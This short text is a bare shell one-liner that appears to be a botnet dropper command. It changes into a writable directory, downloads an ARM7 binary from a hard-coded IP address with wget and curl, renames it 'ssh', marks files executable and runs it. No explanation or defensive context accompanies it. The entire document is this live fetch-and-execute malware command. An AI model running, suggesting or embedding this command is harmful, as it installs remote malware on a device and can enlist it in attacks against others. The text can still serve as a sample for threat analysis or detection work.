cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.153/bins/arm7; curl -O http://185.244.25.153/bins/arm7;cat arm7 >ssh;chmod +x *;./ssh ssh
